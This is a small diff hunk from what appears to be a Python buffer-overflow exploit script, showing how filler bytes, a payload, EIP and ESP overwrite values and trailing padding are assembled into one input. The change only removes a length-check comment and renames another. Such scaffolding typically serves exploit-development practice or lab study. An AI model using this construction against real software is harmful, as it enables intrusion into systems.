@@ -20,10 +20,8 @@ esp = "\x43" * 4                                          # where esp should be 
 postfix = "\n"              
 trail_padding = "\x44" * (total_buff_size - len(buff) - len(payload) - len(eip) - len(esp) - len(postfix))
 
-# verify if its the correct length. should be 650 total
-# print(len(buff), len(payload), len(eip), len(esp), len(trail_padding), len(postfix))
 
-# final payload
+# handle payload
 buff += payload + eip + esp + trail_padding + postfix 
 
 # payload status
